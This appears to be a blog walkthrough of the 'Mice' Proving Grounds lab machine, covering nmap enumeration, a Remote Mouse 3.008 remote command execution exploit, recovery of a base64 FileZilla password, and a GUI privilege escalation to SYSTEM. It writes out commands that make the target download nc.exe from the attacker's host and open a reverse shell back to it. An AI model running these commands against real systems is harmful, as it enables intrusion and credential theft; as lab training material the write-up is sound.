---
title: Mice  PGP walkthrough
description: Target - Mice, OS - Windows
readTime: 10 min read
image: ../assets/images/mice/rdesk.png
date: 12-20-2025
---

# *Enumeration*

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -n -p- -T4 --open -Pn -oN Mice-nmap 192.168.118.199

Nmap scan report for 192.168.118.199
Host is up (0.32s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        VERSION
1978/tcp open  remotemouse    Emote Remote Mouse
1979/tcp open  unisql-java?
1980/tcp open  pearldoc-xact?
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
| ssl-cert: Subject: commonName=Remote-PC
| Not valid before: 2025-12-02T17:03:21
|_Not valid after:  2026-06-03T17:03:21
|_ssl-date: 2025-12-21T12:44:17+00:00; -25s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REMOTE-PC
|   NetBIOS_Domain_Name: REMOTE-PC
|   NetBIOS_Computer_Name: REMOTE-PC
|   DNS_Domain_Name: Remote-PC
|   DNS_Computer_Name: Remote-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2025-12-21T12:43:48+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -25s, deviation: 0s, median: -25s

```

From the nmap scan results the service running on  port 1978 looked interesting.

Ran searchsploit to find exploits if any exist and there is one

```
searchsploit 'emote remote mouse'

RemoteMouse 3.008 - Arbitrary Remote Command Execution | windows/remote/46697.py
```

Searched for exploit and found this one to be clear.
https://github.com/p0dalirius/RemoteMouse-3.008-Exploit

---

# *Initial Access*


Executed the exploit with required parameters. 
Hosted a server 

The exploit fetched the nc.exe from local and stored it under C:/Windows/Temp/nc.exe as mentioned. Curl is along with powershell  for --cmd parameter.

```
python3 RemoteMouse-3.008-Exploit.py -t 192.168.118.199 --cmd 'powershell -c "curl http://192.168.45.179/nc.exe -o C:/Windows/Temp/nc.exe"`
```

Again executed the exploit to trigger the reverse shell.

```
python3 RemoteMouse-3.008-Exploit.py -t 192.168.118.199 --v --cmd 'powershell -c "C:/Windows/Temp/nc.exe 192.168.45.179 80 -e cmd"'
```


![exp](/1dragon/assets/images/mice/exp.png)

At local 

```
rlwrap nc -lnvp 80
```

After the exploit executed reverse shell has be connected successfully.

![](/1dragon/assets/images/mice/shell-divine.png)
 

Got the local.txt under C:\Users\Divine\Desktop

![](/1dragon/assets/images/mice/local.png)

---
 # *Privilege Escalation*

Earlier nmap scan results showed that FileZilla service exist which is a lead for further internal enumeration.

Internal exploration revealed FileZilla was installed on the target.
A web search about FileZilla credential location showed where it stores user password and that is  in  `/Appdata/FileZilla` directory

Based on that search information while analyzing internal directories, files found a file named as recentserver.xml which contained a base64 encoded password under `C:\Users\divine\Appdata\Roaming\FileZilla>`

![](/1dragon/assets/images/mice/filzilla.png)

Further decoder the hash with base64 -d and found the password
![](/1dragon/assets/images/mice/hashed.png)

Fu.rther logged into the system via rdesktop as user divine

![](/1dragon/assets/images/mice/rdesk.png)


Searched for exploit in searchsploit DB and mirrored the exploit. That is CVE-2021-35448.

```
searchsploit remote mouse
Remote Mouse GUI 3.008 - Local Privilege Escalation | windows/local/50047.txt
searchsploit -m 50047.txt
```

The exploit has steps to reproduce.

```
Steps to reproduce:

1. Open Remote Mouse from the system tray
2. Go to "Settings"
3. Click "Change..." in "Image Transfer Folder" section
4. "Save As" prompt will appear
5. Enter "C:\Windows\System32\cmd.exe" in the address bar
6. A new command prompt is spawned with Administrator privileges
```

Followed those steps in Remote Mouse GUI and cmd prompted as administrator.

![](/1dragon/assets/images/mice/gui.png)

`whoami` showed the user as NT Authority\System
Finally proof.txt was captured successfully under `C:\Users\Administrator\Desktop`

![NT](/1dragon/assets/images/mice/nt.png)

---


										Target compromised - |^| ^( |< 3 D

